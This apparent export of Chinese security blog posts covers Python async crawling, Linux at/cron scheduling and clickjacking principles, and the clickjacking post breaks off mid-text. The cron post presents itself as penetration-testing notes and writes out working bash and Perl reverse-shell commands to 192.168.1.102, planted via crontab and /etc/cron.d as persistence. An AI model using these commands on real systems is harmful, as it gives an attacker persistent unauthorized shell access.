<h3 id="同时使用多进程和异步协程进行请求"><a href="#同时使用多进程和异步协程进行请求" class="headerlink" title="同时使用多进程和异步协程进行请求"></a>同时使用多进程和异步协程进行请求</h3><blockquote>
<p>异步协程和多进程对网络请求都有提升,将二者结合起来：Facebook 的 John Reese 介绍了 asyncio 和 multiprocessing 各自的特点，并开发了一个新的库，叫做 aiomultiprocess</p>
</blockquote>
<ol>
<li><p>安装aiomultiprocess  <code>pip3 install aiomultiprocess</code></p>
</li>
<li><p>改写请求网络的代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> aiomultiprocess <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url)</span>:</span></span><br><span class="line">    session = aiohttp.ClientSession()</span><br><span class="line">    response = <span class="keyword">await</span> session.get(url)</span><br><span class="line">    result = <span class="keyword">await</span> response.text()</span><br><span class="line">    session.close()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    urls = [url <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">100</span>)]</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> Pool() <span class="keyword">as</span> pool:</span><br><span class="line">        result = <span class="keyword">await</span> pool.map(get, urls)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">coroutine = request()</span><br><span class="line">task = asyncio.ensure_future(coroutine)</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(task)</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>, end - start)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="骚思路学习"><a href="#骚思路学习" class="headerlink" title="骚思路学习"></a>骚思路学习</h3><h4 id="requests实现异步爬虫一"><a href="#requests实现异步爬虫一" class="headerlink" title="requests实现异步爬虫一"></a>requests实现异步爬虫一</h4><blockquote>
<p>如同前面介绍如何在asyncio中使用requests模块一样，如果想在asyncio中使用其他阻塞函数，该怎么实现呢？虽然目前有异步函数支持asyncio，但实际问题是大部分IO模块还不支持asyncio。 阻塞函数(例如io读写，requests网络请求)阻塞了客户代码与asycio事件循环的唯一线程，因此在执行调用时，整个应用程序都会冻结。</p>
</blockquote>
<ul>
<li><p>解决方案：这个问题的解决方法是使用事件循环对象的run_in_executor方法。asyncio的事件循环在背后维护着一个ThreadPoolExecutor对象，我们可以调用run_in_executor方法，把可调用对象发给它执行，即可以通过run_in_executor方法来新建一个线程来执行耗时函数。</p>
</li>
<li><p>run_in_executor方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AbstractEventLoop.run_in_executor(executor, func, *args)</span><br><span class="line">executor 参数应该是一个 Executor 实例。如果为 None，则使用默认 executor。</span><br><span class="line">func 就是要执行的函数</span><br><span class="line">args 就是传递给 func 的参数</span><br></pre></td></tr></table></figure>
</li>
<li><p>实例（使用time.sleep()）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(url)</span>:</span></span><br><span class="line">    print(<span class="string">"start "</span>,url)</span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">await</span> loop.run_in_executor(<span class="keyword">None</span>,time.sleep,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">    print(<span class="string">"stop "</span>,url)</span><br><span class="line">url_list = [<span class="string">"https://thief.one"</span>,<span class="string">"https://home.nmask.cn"</span>,<span class="string">"https://movie.nmask.cn"</span>,<span class="string">"https://tool.nmask.cn"</span>]</span><br><span class="line">tasks = [asyncio.ensure_future(run(url)) <span class="keyword">for</span> url <span class="keyword">in</span> url_list]</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果</span></span><br><span class="line">start  https://thief.one</span><br><span class="line">start  https://home.nmask.cn</span><br><span class="line">start  https://movie.nmask.cn</span><br><span class="line">start  https://tool.nmask.cn</span><br><span class="line">stop  https://home.nmask.cn</span><br><span class="line">stop  https://thief.one</span><br><span class="line">stop  https://tool.nmask.cn</span><br><span class="line">stop  https://movie.nmask.cn</span><br></pre></td></tr></table></figure>
</li>
<li><p>有了run_in_executor方法，我们就可以使用之前熟悉的模块创建协程并发了，而不需要使用特定的模块进行IO异步开发。</p>
</li>
</ul>
<h4 id="requests实现异步爬虫二"><a href="#requests实现异步爬虫二" class="headerlink" title="requests实现异步爬虫二"></a>requests实现异步爬虫二</h4><blockquote>
<p>上面说了通过run_in_executor方法来添加线程的方式实现异步。在与之前学过的多线程、多进程相比，asyncio模块有一个非常大的不同：传入的函数不是随心所欲，所以这里以实现time.sleep的时的异步；以及修改函数为一个我们自己定义的函数。</p>
</blockquote>
<ol>
<li><p>实现time.sleep时的异步（run_in_executor开启了新的线程，再协调各个线程）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">start = time.time()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myfun</span><span class="params">(i)</span>:</span></span><br><span class="line">    print(<span class="string">'start &#123;&#125;th'</span>.format(i))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'finish &#123;&#125;th'</span>.format(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    futures = (</span><br><span class="line">        loop.run_in_executor(</span><br><span class="line">            <span class="keyword">None</span>,</span><br><span class="line">            myfun,</span><br><span class="line">            i)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> <span class="keyword">await</span> asyncio.gather(*futures):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(main())</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line">print(end - start)</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">start <span class="number">0</span>th</span><br><span class="line">start <span class="number">1</span>th</span><br><span class="line">start <span class="number">2</span>th</span><br><span class="line">start <span class="number">3</span>th</span><br><span class="line">start <span class="number">4</span>th</span><br><span class="line">start <span class="number">5</span>th</span><br><span class="line">start <span class="number">6</span>th</span><br><span class="line">start <span class="number">7</span>th</span><br><span class="line">start <span class="number">8</span>th</span><br><span class="line">start <span class="number">9</span>th</span><br><span class="line">finish <span class="number">0</span>th</span><br><span class="line">finish <span class="number">3</span>th</span><br><span class="line">finish <span class="number">2</span>th</span><br><span class="line">finish <span class="number">1</span>th</span><br><span class="line">finish <span class="number">5</span>th</span><br><span class="line">finish <span class="number">4</span>th</span><br><span class="line">finish <span class="number">6</span>th</span><br><span class="line">finish <span class="number">7</span>th</span><br><span class="line">finish <span class="number">8</span>th</span><br><span class="line">finish <span class="number">9</span>th</span><br><span class="line"><span class="number">1.008263111114502</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改开启的线程数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> concurrent.futures <span class="keyword">as</span> cf <span class="comment"># 多加一个模块</span></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myfun</span><span class="params">(i)</span>:</span></span><br><span class="line">    print(<span class="string">'start &#123;&#125;th'</span>.format(i))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'finish &#123;&#125;th'</span>.format(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> cf.ThreadPoolExecutor(max_workers = <span class="number">10</span>) <span class="keyword">as</span> executor: <span class="comment"># 设置10个线程</span></span><br><span class="line">        loop = asyncio.get_event_loop()</span><br><span class="line">        futures = (</span><br><span class="line">            loop.run_in_executor(</span><br><span class="line">                executor, <span class="comment"># 按照10个线程来执行</span></span><br><span class="line">                myfun,</span><br><span class="line">                i)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> <span class="keyword">await</span> asyncio.gather(*futures):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(main())</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line">print(end - start)</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改函数为爬去豆瓣的电影标题(实际上没有出发异步)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">get_title</span><span class="params">(a)</span>:</span></span><br><span class="line"></span><br><span class="line">    url = <span class="string">'https://movie.douban.com/top250?start=&#123;&#125;&amp;filter='</span>.format(a*<span class="number">25</span>)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    soup = BeautifulSoup(r.content, <span class="string">'html.parser'</span>)</span><br><span class="line">    lis = soup.find(<span class="string">'ol'</span>, class_=<span class="string">'grid_view'</span>).find_all(<span class="string">'li'</span>)</span><br><span class="line">    <span class="keyword">for</span> li <span class="keyword">in</span> lis:</span><br><span class="line">        title = li.find(<span class="string">'span'</span>, class_=<span class="string">"title"</span>).text</span><br><span class="line">        print(title)</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">fun_list = (get_title(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>))</span><br><span class="line">loop.run_until_complete(asyncio.gather(*fun_list))</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line">print(end - start)</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果：（部分结果）</span></span><br><span class="line">变脸</span><br><span class="line">卡萨布兰卡</span><br><span class="line">海盗电台</span><br><span class="line"><span class="number">8.284837245941162</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改用run_in_executor开启了新的线程触发异步</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> concurrent.futures <span class="keyword">as</span> cf</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_title</span><span class="params">(i)</span>:</span></span><br><span class="line">    url = <span class="string">'https://movie.douban.com/top250?start=&#123;&#125;&amp;filter='</span>.format(i*<span class="number">25</span>)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    soup = BeautifulSoup(r.content, <span class="string">'html.parser'</span>)</span><br><span class="line">    lis = soup.find(<span class="string">'ol'</span>, class_=<span class="string">'grid_view'</span>).find_all(<span class="string">'li'</span>)</span><br><span class="line">    <span class="keyword">for</span> li <span class="keyword">in</span> lis:</span><br><span class="line">        title = li.find(<span class="string">'span'</span>, class_=<span class="string">"title"</span>).text</span><br><span class="line">        print(title)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> cf.ThreadPoolExecutor(max_workers = <span class="number">10</span>) <span class="keyword">as</span> executor:</span><br><span class="line">        loop = asyncio.get_event_loop()</span><br><span class="line">        futures = (</span><br><span class="line">            loop.run_in_executor(</span><br><span class="line">                executor,</span><br><span class="line">                get_title,</span><br><span class="line">                i)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> <span class="keyword">await</span> asyncio.gather(*futures):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(main())</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line"></span><br><span class="line">print(end - start)</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果：（部分）</span></span><br><span class="line">当幸福来敲门</span><br><span class="line">乱世佳人</span><br><span class="line">怦然心动</span><br><span class="line"><span class="number">0.8107953071594238</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通过对比可以看出python中协程可以极大的提升I/O操作的效率，在上述爬去豆瓣的250个电影标题中效率提升了一个数量级。</p>
</li>
</ol>
<h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><blockquote>
<p>第三方库uvloop可以对aiohttp加速，uvloop库基于libuv，也就是nodejs用的那个库。使用它也非常方便；有一个问题就是uvloop仅支持在Linux下的使用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;<span class="keyword">import</span> asyncio</span><br><span class="line">&gt;<span class="keyword">import</span> uvloop</span><br><span class="line">&gt;asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>​    </p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本次通过学习python协程，对于python的高并发、异步编程做了较为全面的了解，同时对python的多线程、多进程、线程池、进程池等问题进行了回顾总结，提升编写工具的性能，目前来说满足了需求，通过本次学习，弥补了一些短板的地方。学习任重而道远！</p>
<h4 id="本次学习参考的资料链接如下："><a href="#本次学习参考的资料链接如下：" class="headerlink" title="本次学习参考的资料链接如下："></a>本次学习参考的资料链接如下：</h4><p>[]:<a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/00143208573480558080fa77514407cb23834c78c6c7309000" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/00143208573480558080fa77514407cb23834c78c6c7309000</a></p>
<p>[]:<a href="https://cuiqingcai.com/6160.html" target="_blank" rel="noopener">https://cuiqingcai.com/6160.html</a></p>
<p>[]:<a href="http://www.langzi.fun/Python%E5%8D%8F%E7%A8%8B.html" target="_blank" rel="noopener">http://www.langzi.fun/Python%E5%8D%8F%E7%A8%8B.html</a></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>异步</tag>
      </tags>
  </entry>
  <entry>
    <title>winRAR远程代码执行漏洞复现(CVE-2018-20250)</title>
    <url>/2018/11/08/winRAR%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2018-20250/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />
    <label for="pass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">

</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>winRAR</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux定时任务</title>
    <url>/2018/11/08/Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/</url>
    <content><![CDATA[<h3 id="Linux中的定时任务"><a href="#Linux中的定时任务" class="headerlink" title="Linux中的定时任务"></a>Linux中的定时任务</h3><blockquote>
<p>主要是为了在Linux中进行一些定时操作，定时任务在平时见到的挖矿中比较多，在渗透中定时任务可以用在反弹shell,在这里记录放在再被网上的坑爹文章误导了</p>
</blockquote>
<p>计划任务主要分为定时型的还有突发性的</p>
<h3 id="定时任务——突发性"><a href="#定时任务——突发性" class="headerlink" title="定时任务——突发性"></a>定时任务——突发性</h3><p>at：它是一个可以处理仅执行一次就结束的指令 </p>
<p>at语法格式：at 时间 </p>
<p>安装at   <code>sudo apt-get update &amp;&amp; sudo apt-get install at</code></p>
<p>启动服务  <code>sudo systemctl restart atd</code></p>
<p><strong>at计划任务的特殊写法</strong> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">at 20:00 2018-10-1 在某天</span><br><span class="line"></span><br><span class="line">at now +10min 在 10分钟后执行</span><br><span class="line"></span><br><span class="line">at 17:00 tomorrow 明天下午5点执行</span><br><span class="line"></span><br><span class="line">at 6:00 pm +3 days 在3天以后的下午6点执行</span><br></pre></td></tr></table></figure>
<p>实例：重定向字符串到一个txt中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">at now + 1min </span><br><span class="line">warning: commands will be executed using /bin/sh</span><br><span class="line">at&gt; <span class="built_in">echo</span> <span class="string">"at_test"</span> &gt;&gt; ./ats.txt	</span><br><span class="line"><span class="comment">#然后按  ctrl + d保存</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573220165.48.png" alt></p>
<p><strong>删除计划任务</strong> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">atq</span><br><span class="line">atrm   任务编号</span><br><span class="line">atq</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573220285.31.png" alt></p>
<h3 id="定时任务——定时性"><a href="#定时任务——定时性" class="headerlink" title="定时任务——定时性"></a>定时任务——定时性</h3><blockquote>
<p>有两种方式：cron和crontab，两种在写配置文件时语法基本一致，唯一不同点在与使用cron时在/etc/cron.d/目录下写的定时任务的文件中必须要带上执行定时任务的用户，任务才可以执行；而crontab可以不用执行用户即可执行，使用场景不一样，但是一般在反弹shell时使用写入配置文件比较好。</p>
</blockquote>
<h4 id="crontab定时任务的使用"><a href="#crontab定时任务的使用" class="headerlink" title="crontab定时任务的使用"></a>crontab定时任务的使用</h4><p>语法：#crontab -u -e</p>
<p>常用选项：</p>
<p>-l：list，列出指定用户的计划任务列表</p>
<p>-e：edit，编辑指定用户的计划任务列表</p>
<p>-u：user，指定的用户名，如果不指定，则表示当前用户</p>
<p>-r：remove，删除指定用户的计划任务列表</p>
<p><strong>查看计划任务：</strong> <code>crontab -l</code></p>
<p><strong>编写计划任务：</strong> <code>crontab -e</code> </p>
<p>计划任务的规则语法格式，以行为单位，一行为一个计划：</p>
<p><strong>分 时 日 月 周</strong> 需要执行的命令</p>
<p>执行的命令建议写成<strong>绝对路径</strong>的格式！</p>
<p>取值范围（常识）：</p>
<p>分：0~59</p>
<p>时：0~23</p>
<p>日：1~31</p>
<p>月：1~12</p>
<p>周：0~7，0和7表示星期天</p>
<p>四个符号：</p>
<p>*：表示取值范围中的每一个数字</p>
<p>-：做连续区间表达式的，要想表示1~7，则可以写成：1-7</p>
<p>/：表示每多少个，例如：想每10分钟一次，则可以在分的位置写：*/10</p>
<p>,：表示多个取值，比如想在1点，2点6点执行，则可以在时的位置写：1,2,6</p>
<p><strong>删除命令：</strong> <code>crontab -r</code></p>
<p>实例：利用crontab写入计划任务反弹shell(每隔一分钟执行一次)</p>
<p>bash反弹shell指令在计划任务中不太好使，利用Perl加载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.102/8888 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">*/1 * * * * /usr/bin/perl -e <span class="string">'use Socket;$i="192.168.1.102";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure>
<p>crontab -e写入计划任务</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573222011.42.png" alt></p>
<h4 id="写入-etc-cron-d目录-常用"><a href="#写入-etc-cron-d目录-常用" class="headerlink" title="写入/etc/cron.d目录(常用)"></a>写入/etc/cron.d目录(常用)</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /etc/cron.d</span><br><span class="line">vim root</span><br><span class="line">*/1 * * * * root /usr/bin/perl -e &apos;use Socket;$i=&quot;192.168.1.102&quot;;$p=8889;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573222307.76.png" alt></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/getbird/p/10857254.html" target="_blank" rel="noopener">https://www.cnblogs.com/getbird/p/10857254.html</a> </p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>定时任务</tag>
      </tags>
  </entry>
  <entry>
    <title>界面劫持</title>
    <url>/2018/10/27/%E7%95%8C%E9%9D%A2%E5%8A%AB%E6%8C%81/</url>
    <content><![CDATA[<h3 id="界面劫持"><a href="#界面劫持" class="headerlink" title="界面劫持"></a>界面劫持</h3><p>界面劫持攻击时一种基于视觉欺骗的web会话劫持攻击，它通过在网页的可见控件上覆盖一个不可见的框(iframe)，使得用户误以为在操作可见控件，而实际上用户的操作行为被其不可见的框所劫持，执行不可见框中的恶意劫持代码，从而完成在用户不知情的情况下窃取敏感信息、篡改数据等攻击。</p>
<h3 id="界面劫持分类"><a href="#界面劫持分类" class="headerlink" title="界面劫持分类"></a>界面劫持分类</h3><ul>
<li>点击劫持：劫持用户的鼠标点击操作</li>
<li>拖放劫持：劫持用户的鼠标拖放行为(鼠标拖放行为不受跨域的限制)</li>
<li>触屏劫持：劫持用户触摸屏幕的行为</li>
</ul>
<h3 id="劫持原理"><a href="#劫持原理" class="headerlink" title="劫持原理"></a>劫持原理</h3><p>劫持是通过覆盖一个不可见的框，从原理上来说是一个透明层+iframe，透明层是指页面的透明度为零</p>
<h4 id="透明层使用CSS样式实现"><a href="#透明层使用CSS样式实现" class="headerlink" title="透明层使用CSS样式实现"></a>透明层使用CSS样式实现</h4><p>IE浏览器使用私有的CSS透明属性</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">filter:alpha(opacity=<span class="number">50</span>) <span class="comment">//数值从0-100，数值越小，透明度越高</span></span><br></pre></td></tr></table></figure>
<p>chrome、Firefox等使用的CSS透明属性如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">opacity:<span class="number">0.5</span> <span class="comment">//数值从0-1，数值越小，透明度越高</span></span><br></pre></td></tr></table></figure>
<p>控件位置之间的层次关系使用z-index，任何浏览器都支持</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">z-index:<span class="number">1</span>   <span class="comment">//数值可以是负数，高数值的控件会低于低数值控件的前面，数值越高，控件越靠近用户</span></span><br></pre></td></tr></table></figure>
<h4 id="使用iframe嵌入被劫持的页面"><a href="#使用iframe嵌入被劫持的页面" class="headerlink" title="使用iframe嵌入被劫持的页面"></a>使用iframe嵌入被劫持的页面</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe id=<span class="string">"victim"</span> src=<span class="string">"http://www.victim.com"</span> scrolling=<span class="string">"no"</span>&gt;   <span class="comment">//通过页面透明层+iframe实现对用户的视觉欺骗，即用户看到的操作对象和实际的操作对象是不一致的</span></span><br></pre></td></tr></table></figure>
<h3 id="拖放劫持相关"><a href="#拖放劫持相关" class="headerlink" title="拖放劫持相关"></a>拖放劫持相关</h3><blockquote>
<p>由于拖放劫持和触屏劫持实现较负载，这里只了解相关知识</p>
</blockquote>
<h4 id="拖放劫持的思路"><a href="#拖放劫持的思路" class="headerlink" title="拖放劫持的思路"></a>拖放劫持的思路</h4><p>“拖放劫持”的思路是诱使用户从隐藏的不可见iframe中”拖拽”出攻击者希望得到的数据，然后放到攻击者能控制的另外一个页面中，从而窃取数据。（突破同源限制）</p>
<h4 id="拖放劫持技术原理"><a href="#拖放劫持技术原理" class="headerlink" title="拖放劫持技术原理"></a>拖放劫持技术原理</h4><p>支持Drag&amp;Drop API</p>
<blockquote>
<p>主流的浏览器都有drag-and-drop API 接口，供网站开发人员创建交互式网页。但是，这些 API 接口在设计时没有考虑很多的安全性问题，导致通过拖拽就可以实现跨域操作。利用拖拽技术，攻击者可以突破很多已有的安全防御措施。</p>
<p>利用拖拽技术，攻击者可以轻易将文本注入到目标网页。在实际实施过程中，攻击者欺骗用户选择输入框的内容，完成拖拽操作。另外一种方式是，通过浏览器的 API 接口将 iframe 中的内容拖拽到目标网页的 text area 中，攻击者就可以获得用户网页中存在的敏感信息。</p>
</blockquote>
<p>dataTransfer对象</p>
<blockquote>
<p>为了能够协助通过拖放操作传递数据，在IE5.0以后引入了dataTransfer对象，他作为event对象的一个属性出现，用于从被拖动的对象传递字符串到放置对象。</p>
<p>dataTransfer对象定义了两个主要方法：getData()和setData().getData操作完成获取由setData所存储的数据。setData操作完成向系统剪贴板中存储需要传递的数据，传递数据分为两种类型：文本数据和URL数据。在HTML5的扩展中，其允许指定任意的MIME类型。有了dataTransfer对象和操作方法后，就为跨域传递数据提供了有效的技术手段</p>
</blockquote>
<h4 id="拖放劫持防御方法"><a href="#拖放劫持防御方法" class="headerlink" title="拖放劫持防御方法"></a>拖放劫持防御方法</h4><p>目前只有FireFox和IE浏览器支持拖放功能，Chrome并不支持拖放功能，所以使用Chrome浏览器可在一定程度上防御拖放攻击；对于IE浏览器来说，不使用ActiveX这类危险组件也可以有效防御拖放攻击。</p>
<h3 id="触屏劫持相关"><a href="#触屏劫持相关" class="headerlink" title="触屏劫持相关"></a>触屏劫持相关</h3><blockquote>
<p>较为复杂，了解相关知识</p>
</blockquote>
<h4 id="触屏劫持防御"><a href="#触屏劫持防御" class="headerlink" title="触屏劫持防御"></a>触屏劫持防御</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、不点击任何不明网站、App上弹出的各种提示信息，例如：手机中病毒需升级杀毒软件等等。最好使用返回键，返回上一级页面，如若恶意跳转，大概率为恶意网站且包含触屏劫持。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">2、苹果手机在使用Safari浏览器的时候，遇到不明情况的提示框或页面，一定要确认地址栏的地址是否隐藏以及是否正确，若网站上含有触屏劫持，则大概率会添加假的地址栏做误导，需谨慎认清。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">3、安卓手机要多加注意提示框弹出前后，手机系统给出的提示，由于不同安卓手机有很大差别触屏劫持在不同手机上会有不同的效果，但在获取权限时系统都会有好几步的确认工作，所以要多加注意之中细微的差别。</span><br></pre></td></tr></table></figure>
<h3 id="点击劫持技术实现"><a href="#点击劫持技术实现" class="headerlink" title="点击劫持技术实现"></a>点击劫持技术实现</h3><p>构造一个点击页面，上面覆盖一个透明层的iframe，当诱导用户点击时触发iframe中的页面中的login按钮</p>
